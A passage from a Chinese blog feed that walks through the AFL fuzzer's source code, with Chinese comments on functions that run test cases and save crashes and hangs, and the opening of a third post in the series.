class="hljs-number">3</span>:   <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span> ... <span class="hljs-number">7</span>:   perf_score *= <span class="hljs-number">2</span>; <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">8</span> ... <span class="hljs-number">13</span>:  perf_score *= <span class="hljs-number">3</span>; <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">14</span> ... <span class="hljs-number">25</span>: perf_score *= <span class="hljs-number">4</span>; <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:        perf_score *= <span class="hljs-number">5</span>;<br><br>  &#125;<br><br>  <span class="hljs-comment">/* Make sure that we don&#x27;t go over limit. */</span><br><br>  <span class="hljs-keyword">if</span> (perf_score &gt; HAVOC_MAX_MULT * <span class="hljs-number">100</span>) perf_score = HAVOC_MAX_MULT * <span class="hljs-number">100</span>;<br><br>  <span class="hljs-keyword">return</span> perf_score;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="common-fuzz-stuff"><a href="#common-fuzz-stuff" class="headerlink" title="common_fuzz_stuff"></a>common_fuzz_stuff</h3><p>修改测试用例，执行target程序，处理结果。处理成功返回0，否则返回1。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Write a modified test case, run program, process results. Handle</span><br><span class="hljs-comment">   error conditions, returning 1 if it&#x27;s time to bail out. This is</span><br><span class="hljs-comment">   a helper function for fuzz_one(). */</span><br><br>EXP_ST u8 <span class="hljs-title function_">common_fuzz_stuff</span><span class="hljs-params">(<span class="hljs-type">char</span>** argv, u8* out_buf, u32 len)</span> &#123;<br><br>  u8 fault;<br>  <br>  <span class="hljs-comment">// static u8* (*post_handler)(u8* buf, u32* len);</span><br>  <span class="hljs-keyword">if</span> (post_handler) &#123;   <span class="hljs-comment">// 若post_handler不为空</span><br><br>    out_buf = post_handler(out_buf, &amp;len);      <span class="hljs-comment">// 调用post_handler，即afl_postprocess处理out_buf</span><br>    <span class="hljs-keyword">if</span> (!out_buf || !len) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;     <span class="hljs-comment">// 若out_buf为空，或者len等于0，直接返回</span><br><br>  &#125;<br><br>  write_to_testcase(out_buf, len);      <span class="hljs-comment">// 将out_buf写入out_file</span><br><br>  fault = run_target(argv, exec_tmout); <span class="hljs-comment">// 执行目标程序</span><br><br>  <span class="hljs-keyword">if</span> (stop_soon) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><br>  <span class="hljs-keyword">if</span> (fault == FAULT_TMOUT) &#123;   <span class="hljs-comment">// 若fault等于FAULT_TMOUT，即出现了超时错误</span><br><br>    <span class="hljs-keyword">if</span> (subseq_tmouts++ &gt; TMOUT_LIMIT) &#123;        <span class="hljs-comment">// subseq_tmouts + 1</span><br>      cur_skipped_paths++;      <span class="hljs-comment">// cur_skipped_paths + 1</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>  &#125; <span class="hljs-keyword">else</span> subseq_tmouts = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-comment">/* Users can hit us with SIGUSR1 to request the current input</span><br><span class="hljs-comment">     to be abandoned. */</span><br><br>  <span class="hljs-keyword">if</span> (skip_requested) &#123; <span class="hljs-comment">// 若skip_requested不为空，即当前输入被抛弃</span><br><br>     skip_requested = <span class="hljs-number">0</span>;<br>     cur_skipped_paths++;<br>     <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><br>  &#125;<br><br>  <span class="hljs-comment">/* This handles FAULT_ERROR for us: */</span><br><br>  queued_discovered += save_if_interesting(argv, out_buf, len, fault);  <span class="hljs-comment">// 发现了新路径，queued_discovered + 1</span><br><br>  <span class="hljs-keyword">if</span> (!(stage_cur % stats_update_freq) || stage_cur + <span class="hljs-number">1</span> == stage_max)<br>    show_stats();       <span class="hljs-comment">// 若stage_cur是stats_update_freq的整数倍或是执行到最后一轮，展示stats</span><br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="save-if-interesting"><a href="#save-if-interesting" class="headerlink" title="save_if_interesting"></a>save_if_interesting</h3><p>判断case是否为interesting模式。若是crash，则保存case到queue文件夹以及crash文件夹中，设置keeping为1，返回1；若是tmout，保存到hangs文件夹中，返回0。其它情况也返回0。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Check if the result of an execve() during routine fuzzing is interesting,</span><br><span class="hljs-comment">   save or queue the input test case for further analysis if so. Returns 1 if</span><br><span class="hljs-comment">   entry is saved, 0 otherwise. */</span><br><br><span class="hljs-type">static</span> u8 <span class="hljs-title function_">save_if_interesting</span><span class="hljs-params">(<span class="hljs-type">char</span>** argv, <span class="hljs-type">void</span>* mem, u32 len, u8 fault)</span> &#123;<br><br>  u8  *fn = <span class="hljs-string">&quot;&quot;</span>;<br>  u8  hnb;<br>  s32 fd;<br>  u8  keeping = <span class="hljs-number">0</span>, res;<br><br>  <span class="hljs-keyword">if</span> (fault == crash_mode) &#123;    <span class="hljs-comment">// 若fault为crash_mode</span><br><br>    <span class="hljs-comment">/* Keep only if there are new bits in the map, add to queue for</span><br><span class="hljs-comment">       future fuzzing, etc. */</span><br><br>    <span class="hljs-keyword">if</span> (!(hnb = has_new_bits(virgin_bits))) &#123;   <span class="hljs-comment">// 判断是否发现了新的路径或者path的命中率增加</span><br>      <span class="hljs-keyword">if</span> (crash_mode) total_crashes++;          <span class="hljs-comment">// 若crash_mode不为空，total_crashed + 1</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;    <br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> SIMPLE_FILES</span><br><br>    fn = alloc_printf(<span class="hljs-string">&quot;%s/queue/id:%06u,%s&quot;</span>, out_dir, queued_paths,<br>                      describe_op(hnb));        <span class="hljs-comment">// fn = out_dir/queue/id:</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><br>    fn = alloc_printf(<span class="hljs-string">&quot;%s/queue/id_%06u&quot;</span>, out_dir, queued_paths);<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* ^!SIMPLE_FILES */</span></span><br><br>    add_to_queue(fn, len, <span class="hljs-number">0</span>);   <span class="hljs-comment">// 将fn添加到队列中</span><br><br>    <span class="hljs-keyword">if</span> (hnb == <span class="hljs-number">2</span>) &#123;     <span class="hljs-comment">// 发现了新路径</span><br>      queue_top-&gt;has_new_cov = <span class="hljs-number">1</span>;<br>      queued_with_cov++;<br>    &#125;<br><br>    queue_top-&gt;exec_cksum = hash32(trace_bits, MAP_SIZE, HASH_CONST);   <span class="hljs-comment">// 计算trace_bits校验和</span><br><br>    <span class="hljs-comment">/* Try to calibrate inline; this also calls update_bitmap_score() when</span><br><span class="hljs-comment">       successful. */</span><br><br>    res = calibrate_case(argv, queue_top, mem, queue_cycle - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);     <span class="hljs-comment">// 对新添加的路径进行评测</span><br><br>    <span class="hljs-keyword">if</span> (res == FAULT_ERROR)     <span class="hljs-comment">// 若res返回值为FAULT_ERROR，报错并退出</span><br>      FATAL(<span class="hljs-string">&quot;Unable to execute target application&quot;</span>);<br><br>    fd = open(fn, O_WRONLY | O_CREAT | O_EXCL, <span class="hljs-number">0600</span>);   <span class="hljs-comment">// 以只写方式打开fn文件</span><br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) PFATAL(<span class="hljs-string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, fn);<br>    ck_write(fd, mem, len, fn); <span class="hljs-comment">// 将mem写入文件</span><br>    close(fd);<br><br>    keeping = <span class="hljs-number">1</span>;<br><br>  &#125;<br><br>  <span class="hljs-keyword">switch</span> (fault) &#123;      <span class="hljs-comment">// 判断报错类型</span><br><br>    <span class="hljs-keyword">case</span> FAULT_TMOUT:   <span class="hljs-comment">// FAULT_TMOUT</span><br><br>      <span class="hljs-comment">/* Timeouts are not very interesting, but we&#x27;re still obliged to keep</span><br><span class="hljs-comment">         a handful of samples. We use the presence of new bits in the</span><br><span class="hljs-comment">         hang-specific bitmap as a signal of uniqueness. In &quot;dumb&quot; mode, we</span><br><span class="hljs-comment">         just keep everything. */</span><br><br>      total_tmouts++;<br><br>      <span class="hljs-keyword">if</span> (unique_hangs &gt;= KEEP_UNIQUE_HANG) <span class="hljs-keyword">return</span> keeping;     <span class="hljs-comment">// 若unique_hangs &gt;= 500，返回keeping</span><br><br>      <span class="hljs-keyword">if</span> (!dumb_mode) &#123; <span class="hljs-comment">// 若不是简易模式</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> WORD_SIZE_64</span><br>        simplify_trace((u64*)trace_bits);       <span class="hljs-comment">// 简化路径</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>        simplify_trace((u32*)trace_bits);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* ^WORD_SIZE_64 */</span></span><br><br>        <span class="hljs-keyword">if</span> (!has_new_bits(virgin_tmout)) <span class="hljs-keyword">return</span> keeping;        <span class="hljs-comment">// 若没有发现新的超时路径，返回kepping</span><br><br>      &#125;<br><br>      unique_tmouts++;  <span class="hljs-comment">// unique_tmounts + 1</span><br><br>      <span class="hljs-comment">/* Before saving, we make sure that it&#x27;s a genuine hang by re-running</span><br><span class="hljs-comment">         the target with a more generous timeout (unless the default timeout</span><br><span class="hljs-comment">         is already generous). */</span><br><br>      <span class="hljs-keyword">if</span> (exec_tmout &lt; hang_tmout) &#123;    <span class="hljs-comment">// 若exec_tmout &lt; hang_tmout，</span><br><br>        u8 new_fault;<br>        write_to_testcase(mem, len);    <span class="hljs-comment">// 将mem写入out_file(.cur_input)中</span><br>        new_fault = run_target(argv, hang_tmout);       <span class="hljs-comment">// 重新执行目标程序</span><br><br>        <span class="hljs-comment">/* A corner case that one user reported bumping into: increasing the</span><br><span class="hljs-comment">           timeout actually uncovers a crash. Make sure we don&#x27;t discard it if</span><br><span class="hljs-comment">           so. */</span><br><br>        <span class="hljs-keyword">if</span> (!stop_soon &amp;&amp; new_fault == FAULT_CRASH) <span class="hljs-keyword">goto</span> keep_as_crash; <span class="hljs-comment">// 若FAULT是FAULT_CRASH，跳转到keep_as_crash</span><br><br>        <span class="hljs-keyword">if</span> (stop_soon || new_fault != FAULT_TMOUT) <span class="hljs-keyword">return</span> keeping;<br><br>      &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> SIMPLE_FILES</span><br><br>      fn = alloc_printf(<span class="hljs-string">&quot;%s/hangs/id:%06llu,%s&quot;</span>, out_dir,<br>                        unique_hangs, describe_op(<span class="hljs-number">0</span>));<br><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><br>      fn = alloc_printf(<span class="hljs-string">&quot;%s/hangs/id_%06llu&quot;</span>, out_dir,<br>                        unique_hangs);<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* ^!SIMPLE_FILES */</span></span><br><br>      unique_hangs++;   <span class="hljs-comment">// unique_hangs + 1</span><br><br>      last_hang_time = get_cur_time();<br><br>      <span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">case</span> FAULT_CRASH:   <span class="hljs-comment">// FAULT_CRASH</span><br><br>keep_as_crash:<br><br>      <span class="hljs-comment">/* This is handled in a manner roughly similar to timeouts,</span><br><span class="hljs-comment">         except for slightly different limits and no need to re-run test</span><br><span class="hljs-comment">         cases. */</span><br><br>      total_crashes++;  <span class="hljs-comment">// 总crashes + 1</span><br><br>      <span class="hljs-keyword">if</span> (unique_crashes &gt;= KEEP_UNIQUE_CRASH) <span class="hljs-keyword">return</span> keeping;<br><br>      <span class="hljs-keyword">if</span> (!dumb_mode) &#123; <span class="hljs-comment">// 若不是dumb_mode</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> WORD_SIZE_64</span><br>        simplify_trace((u64*)trace_bits);       <span class="hljs-comment">// 简化路径</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>        simplify_trace((u32*)trace_bits);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* ^WORD_SIZE_64 */</span></span><br><br>        <span class="hljs-keyword">if</span> (!has_new_bits(virgin_crash)) <span class="hljs-keyword">return</span> keeping;        <span class="hljs-comment">// 判断是否发现新的crash</span><br><br>      &#125;<br><br>      <span class="hljs-keyword">if</span> (!unique_crashes) write_crash_readme();        <span class="hljs-comment">// 创建readme文件</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> SIMPLE_FILES</span><br><br>      fn = alloc_printf(<span class="hljs-string">&quot;%s/crashes/id:%06llu,sig:%02u,%s&quot;</span>, out_dir,<br>                        unique_crashes, kill_signal, describe_op(<span class="hljs-number">0</span>));<br><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><br>      fn = alloc_printf(<span class="hljs-string">&quot;%s/crashes/id_%06llu_%02u&quot;</span>, out_dir, unique_crashes,<br>                        kill_signal);<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* ^!SIMPLE_FILES */</span></span><br><br>      unique_crashes++; <span class="hljs-comment">// unique_crashes + 1</span><br><br>      last_crash_time = get_cur_time();<br>      last_crash_execs = total_execs;<br><br>      <span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">case</span> FAULT_ERROR: FATAL(<span class="hljs-string">&quot;Unable to execute target application&quot;</span>);<br><br>    <span class="hljs-keyword">default</span>: <span class="hljs-keyword">return</span> keeping;<br><br>  &#125;<br><br>  <span class="hljs-comment">/* If we&#x27;re here, we apparently want to save the crash or hang</span><br><span class="hljs-comment">     test case, too. */</span><br><br>  fd = open(fn, O_WRONLY | O_CREAT | O_EXCL, <span class="hljs-number">0600</span>);     <span class="hljs-comment">// 打开fn文件</span><br>  <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) PFATAL(<span class="hljs-string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, fn);<br>  ck_write(fd, mem, len, fn);   <span class="hljs-comment">// 保存mem到fn文件</span><br>  close(fd);<br><br>  ck_free(fn);<br><br>  <span class="hljs-keyword">return</span> keeping;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="simplify-trace"><a href="#simplify-trace" class="headerlink" title="simplify_trace"></a>simplify_trace</h3><p>简化路径信息，将命中路径设置为0x80，未命中的设置为1。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Destructively simplify trace by eliminating hit count information</span><br><span class="hljs-comment">   and replacing it with 0x80 or 0x01 depending on whether the tuple</span><br><span class="hljs-comment">   is hit or not. Called on every new crash or timeout, should be</span><br><span class="hljs-comment">   reasonably fast. */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> u8 simplify_lookup[<span class="hljs-number">256</span>] = &#123; <br><br>  [<span class="hljs-number">0</span>]         = <span class="hljs-number">1</span>,<br>  [<span class="hljs-number">1</span> ... <span class="hljs-number">255</span>] = <span class="hljs-number">128</span><br><br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> WORD_SIZE_64</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">simplify_trace</span><span class="hljs-params">(u64* mem)</span> &#123;<br><br>  u32 i = MAP_SIZE &gt;&gt; <span class="hljs-number">3</span>;<br><br>  <span class="hljs-keyword">while</span> (i--) &#123;<br><br>    <span class="hljs-comment">/* Optimize for sparse bitmaps. */</span><br><br>    <span class="hljs-keyword">if</span> (unlikely(*mem)) &#123;<br><br>      u8* mem8 = (u8*)mem;<br><br>      mem8[<span class="hljs-number">0</span>] = simplify_lookup[mem8[<span class="hljs-number">0</span>]];<br>      mem8[<span class="hljs-number">1</span>] = simplify_lookup[mem8[<span class="hljs-number">1</span>]];<br>      mem8[<span class="hljs-number">2</span>] = simplify_lookup[mem8[<span class="hljs-number">2</span>]];<br>      mem8[<span class="hljs-number">3</span>] = simplify_lookup[mem8[<span class="hljs-number">3</span>]];<br>      mem8[<span class="hljs-number">4</span>] = simplify_lookup[mem8[<span class="hljs-number">4</span>]];<br>      mem8[<span class="hljs-number">5</span>] = simplify_lookup[mem8[<span class="hljs-number">5</span>]];<br>      mem8[<span class="hljs-number">6</span>] = simplify_lookup[mem8[<span class="hljs-number">6</span>]];<br>      mem8[<span class="hljs-number">7</span>] = simplify_lookup[mem8[<span class="hljs-number">7</span>]];<br><br>    &#125; <span class="hljs-keyword">else</span> *mem = <span class="hljs-number">0x0101010101010101</span>ULL;<br><br>    mem++;<br><br>  &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>参考链接</strong></p><p><a href="https://eternalsakura13.com/2020/08/23/afl/">https://eternalsakura13.com/2020/08/23/afl/</a></p><p><a href="https://hollk.blog.csdn.net/category_11470526.html">https://hollk.blog.csdn.net/category_11470526.html</a></p><p><a href="https://paper.seebug.org/1732/">https://paper.seebug.org/1732/</a></p><p><a href="https://www.z1r0.top/2023/03/23/AFL-fuzz%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">https://www.z1r0.top/2023/03/23/AFL-fuzz%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</a></p>]]></content>
    
    
    <categories>
      
      <category>fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fuzz</tag>
      
      <tag>afl</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AFL源码分析(三)</title>
    <link href="/2023/10/04/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B8%89/"/>
    <url>/2023/10/04/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B8%89/</url>
    
    <content type="html"><![CDATA[<h1 id="AFL源码分析-三"><a href="#AFL源码分析-三" class="headerlink" title="AFL源码分析(三)"></a>AFL源码分析(三)</h1><h2 id="afl-fuzz-c"><a href="#afl-fuzz-c" class="headerlink" title="afl-fuzz.c"></a>afl-fuzz.c</h2><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span 